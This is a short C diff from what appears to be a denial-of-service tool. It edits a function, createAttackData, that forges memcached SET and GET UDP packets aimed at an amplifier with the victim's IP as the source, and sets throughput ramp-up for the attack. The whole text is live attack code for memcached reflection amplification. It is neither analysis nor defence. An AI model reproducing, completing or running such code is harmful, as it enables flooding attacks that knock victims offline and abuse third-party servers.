@@ -12,9 +12,9 @@ static AttackPlan * createAttackData( AttackDraft *draft )
 
   memalloc( (void *)&newData, sizeof( AttackPlan ) );
   arg = MEMCACHED_SET;
-  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->target_port), GetPort(draft->amp_port), ForgeMemcachedPacket, &arg );
+  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedPacket, &arg );
   arg = MEMCACHED_GET;
-  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->target_port), GetPort(draft->amp_port), ForgeMemcachedPacket, &arg );
+  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedPacket, &arg );
   newData->initialThroughput = draft->initialThroughput;
   newData->incThroughput = draft->incrementThroughput;
   newData->incFrequency = draft->timeFrequency;
